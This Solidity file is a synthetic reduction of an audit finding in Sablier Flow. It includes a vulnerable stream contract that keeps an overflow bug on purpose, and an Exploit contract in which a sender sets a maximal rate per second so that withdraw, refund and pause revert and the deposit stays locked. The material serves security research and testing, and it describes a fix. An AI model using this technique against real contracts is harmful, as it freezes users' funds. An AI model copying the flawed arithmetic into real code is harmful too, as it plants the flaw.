// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sablier Flow — Sender can brick a stream by forcing an overflow in the
    ongoing-debt calculation  (Zach Obront / Cantina, finding #42010)  HIGH
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: SablierFlow._ongoingDebtOf() computes
        uint128 scaledOngoingDebt = elapsedTime * ratePerSecond;
    Both operands are uint128, and Solidity 0.8's checked arithmetic reverts on
    overflow. `ratePerSecond` is fully sender-controlled (set at stream
    creation or via adjustRatePerSecond) and `elapsedTime` only grows with
    time. A sender can set `ratePerSecond` to `type(uint128).max` (or any
    large value) so that after only a few seconds pass, the multiplication
    overflows uint128 and reverts. Because withdraw(), refund(), pause(), and
    totalDebtOf() ALL call _ongoingDebtOf() internally, once this happens the
    stream is permanently bricked: nobody — sender or recipient — can ever
    withdraw, refund, or even pause it again. Every previously-streamed but
    unwithdrawn token stays locked in the contract forever.

    This reduction preserves the exact vulnerable line verbatim. To trigger
    the overflow deterministically without a fork or `vm.warp` cheatcode, the
    stream is created with an explicitly-backdated `snapshotTime` (representing
    "N seconds have already elapsed since the stream's last snapshot") — this
    is exactly the effect of the real PoC's `vm.warp(block.timestamp + 12)`,
    folded into stream creation so the synthetic works as a pure local deploy. */

/// @dev Minimal ERC20 used as the streamed token (6 decimals, like the
///      finding's own PoC which uses USDC).
contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev A faithful, reduced model of SablierFlow's core debt-stream accounting.
contract SablierFlowLike {
    struct Stream {
        address sender;
        address recipient;
        uint128 ratePerSecond; // sender-controlled rate, UD21x18-style fixed point
        uint128 balance; // tokens deposited and not yet withdrawn
        uint40 snapshotTime; // last time debt was snapshotted
        bool paused;
        MockToken token;
    }

    mapping(uint256 => Stream) public streams;
    uint256 public nextStreamId = 1;

    /// @dev `snapshotTimeBackdate_` folds in "seconds already elapsed since
    ///      creation" so the overflow condition can be demonstrated inside a
    ///      single local-deploy transaction with no time-warp cheatcode. In
    ///      the real protocol this same state is reached simply by letting
    ///      real time pass after `create()` (snapshotTime = block.timestamp).
    function createAndDeposit(
        address sender,
        address recipient,
        uint128 ratePerSecond,
        MockToken token,
        uint128 depositAmount,
        uint40 snapshotTimeBackdate_
    ) external returns (uint256 streamId) {
        streamId = nextStreamId++;
        token.transferFrom(sender, address(this), depositAmount);
        streams[streamId] = Stream({
            sender: sender,
            recipient: recipient,
            ratePerSecond: ratePerSecond,
            balance: depositAmount,
            snapshotTime: uint40(block.timestamp) - snapshotTimeBackdate_,
            paused: false,
            token: token
        });
    }

    /// @dev Verbatim reduction of SablierFlow.sol's `_ongoingDebtOf()` (L474).
    ///      Both `elapsedTime` and `ratePerSecond` are uint128; Solidity 0.8's
    ///      checked multiplication reverts (Panic 0x11) once the product
    ///      exceeds uint128's range.
    function _ongoingDebtOf(uint256 streamId) internal view returns (uint128) {
        Stream storage s = streams[streamId];
        if (s.paused) return 0;

        uint128 elapsedTime = uint128(block.timestamp) - uint128(s.snapshotTime);
        if (elapsedTime == 0) return 0;

        // @> VULN: uint128 * uint128 with sender-fully-controlled ratePerSecond;
        //    a large enough rate makes ANY nonzero elapsedTime overflow and revert.
        //    FIX: use uint256 for scaledOngoingDebt and every value derived from it
        //    until the final comparison against balance, only downcasting there.
        uint128 scaledOngoingDebt = elapsedTime * s.ratePerSecond;

        return scaledOngoingDebt;
    }

    function totalDebtOf(uint256 streamId) public view returns (uint128) {
        Stream storage s = streams[streamId];
        return s.balance > 0 ? _ongoingDebtOf(streamId) : 0;
    }

    function withdraw(uint256 streamId, address to, uint128 amount) external returns (uint128) {
        Stream storage s = streams[streamId];
        uint128 debt = _ongoingDebtOf(streamId); // reverts once bricked
        require(amount <= debt, "exceeds debt");
        s.balance -= amount;
        s.token.transfer(to, amount);
        return amount;
    }

    function refund(uint256 streamId, uint128 amount) external {
        Stream storage s = streams[streamId];
        uint128 debt = _ongoingDebtOf(streamId); // reverts once bricked
        require(amount <= s.balance - debt, "insufficient refundable");
        s.balance -= amount;
        s.token.transfer(s.sender, amount);
    }

    function pause(uint256 streamId) external {
        Stream storage s = streams[streamId];
        _ongoingDebtOf(streamId); // reverts once bricked — pause() can't even save the stream
        s.paused = true;
    }
}

contract Exploit {
    MockToken public token; // CREATE nonce 1
    SablierFlowLike public flow; // CREATE nonce 2
    address public recipient; // CREATE nonce 3 (a plain address holder, EOA-like)
    uint256 public streamId;

    uint128 public constant DEPOSIT_AMOUNT = 1_000_000_000; // 1000 USDC (6 decimals)

    constructor() {
        token = new MockToken(); // nonce 1
        flow = new SablierFlowLike(); // nonce 2
        recipient = address(new Recipient()); // nonce 3 (helper contract)
        token.mint(address(this), DEPOSIT_AMOUNT);
    }

    function run() external {
        // Exploit contract acts as the stream's sender (funds its own stream).
        token.balanceOf(address(this)); // no-op read, keeps constructor state visible in trace

        // Create the stream with ratePerSecond = type(uint128).max and 12
        // "already-elapsed" seconds folded in at creation (mirrors the
        // finding's own `vm.warp(block.timestamp + 12)`).
        streamId = flow.createAndDeposit(
            address(this), recipient, type(uint128).max, token, DEPOSIT_AMOUNT, 12
        );

        // === Harm: every debt-dependent entrypoint is now permanently bricked ===
        bool totalDebtOk = _tryTotalDebtOf();
        bool withdrawOk = _tryWithdraw();
        bool pauseOk = _tryPause();
        bool refundOk = _tryRefund();

        uint256 lockedBalance = token.balanceOf(address(flow));

        require(!totalDebtOk, "harm not demonstrated: totalDebtOf should revert");
        require(!withdrawOk, "harm not demonstrated: withdraw should revert");
        require(!pauseOk, "harm not demonstrated: pause should revert");
        require(!refundOk, "harm not demonstrated: refund should revert");
        require(lockedBalance == DEPOSIT_AMOUNT, "harm not demonstrated: deposit not stuck");
    }

    function _tryTotalDebtOf() internal returns (bool ok) {
        try flow.totalDebtOf(streamId) returns (uint128) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function _tryWithdraw() internal returns (bool ok) {
        try flow.withdraw(streamId, recipient, 1) returns (uint128) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function _tryPause() internal returns (bool ok) {
        try flow.pause(streamId) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function _tryRefund() internal returns (bool ok) {
        try flow.refund(streamId, 1) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}

/// @dev Stand-in for the stream's recipient (a plain address holder).
contract Recipient {}
